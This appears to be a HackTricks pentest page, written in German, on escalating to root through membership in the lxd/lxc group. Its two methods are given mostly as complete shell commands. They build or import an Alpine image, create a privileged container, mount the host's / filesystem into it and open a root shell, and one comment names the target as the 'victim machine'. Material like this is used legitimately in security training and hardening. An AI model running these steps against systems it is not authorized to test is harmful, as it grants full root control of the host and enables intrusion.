# lxd/lxc-Gruppe - Privilege escalation

Die Mitgliedschaft in der LXD management group des Hosts (normalerweise _**lxd**_) kann einen Weg zu root ermöglichen, da sie vollständige Kontrolle über den daemon erlaubt.<sup>[[1]](#references)</sup>

## Exploiting ohne Internet

### Method 1

Du kannst ein Alpine image aus einem vertrauenswürdigen repository herunterladen, um es mit LXD zu verwenden.  
Canonical's LXD image server veröffentlicht tägliche Builds: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
Lade einfach sowohl **lxd.tar.xz** als auch **rootfs.squashfs** aus dem neuesten Build herunter (der Verzeichnisname ist das Datum).<sup>[[8]](#references)</sup>

Alternativ kannst du distrobuilder auf deinem Computer installieren, indem du den [project instructions](https://github.com/lxc/distrobuilder) folgst.<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Lade **incus.tar.xz** (**lxd.tar.xz**, wenn du das Image vom Canonical-Image-Server heruntergeladen hast) und **rootfs.squashfs** hoch, importiere anschließend das Image und erstelle einen Container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
> Führe **`lxd init`** aus, richte einen standardmäßigen storage pool ein und wiederhole anschließend den vorherigen Befehlsblock.<sup>[[2]](#references)</sup>

Starte schließlich den Container und öffne eine root shell auf dem Host-Dateisystem:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Methode 2

Erstelle ein Alpine-Image und starte es mit dem Flag `security.privileged=true`, wodurch Container-root auf Host-root abgebildet wird; das Mounten von `/` macht anschließend das Host-Dateisystem innerhalb des Containers zugänglich.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Sicherheit für LXD härten](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [LXD-Container und virtuelle Maschinen](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [So kopiert und importiert man Images](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [So erstellt man Images mit distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Alpine-Image-Definition](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [Build-Script für lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [LXD-Image-Server](https://images.lxd.canonical.com/)
- [9] [Typ: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
